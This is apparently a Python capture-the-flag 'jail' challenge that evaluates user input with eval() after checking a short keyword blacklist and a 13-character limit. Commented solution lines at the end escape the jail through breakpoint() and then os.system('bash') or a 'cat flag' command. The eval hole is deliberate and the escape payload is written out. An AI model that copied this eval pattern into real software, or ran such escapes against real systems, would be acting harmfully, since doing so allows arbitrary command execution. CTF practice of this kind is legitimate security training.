#the length is be limited less than 13
#it seems banned some payload 
#banned some unintend sol
#Can u escape it?Good luck!
 
def filter(s):
    BLACKLIST = ["exec","input","eval"]
    for i in BLACKLIST:
        if i in s:
            print(f'{i!r} has been banned for security reasons')
            exit(0)
 
WELCOME = '''
  _                _                           _       _ _ _                _ ___    _____ 
 | |              (_)                         (_)     (_) | |              | |__ \  | ____|
 | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | _____   _____| |  ) | | |__  
 | '_ \ / _ \/ _` | | '_ \| '_ \ / _ \ '__|   | |/ _` | | | |/ _ \ \ / / _ \ | / /  |___ \ 
 | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | |  __/\ V /  __/ |/ /_ _ ___) |
 |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_|_|\___| \_/ \___|_|____(_)____/ 
              __/ |                          _/ |                                          
             |___/                          |__/                                                                                                            
'''
 
print(WELCOME)
 
print("Welcome to the python jail")
print("Let's have an beginner jail of calc")
print("Enter your expression and I will evaluate it for you.")
input_data = input("> ")
filter(input_data)
if len(input_data)>13:
    print("Oh hacker!")
    exit(0)
print('Answer: {}'.format(eval(input_data)))

# breakpoint()
# import os
# os.system("bash")
#------------------------
# breakpoint()
# __import__('os').system('cat flag')

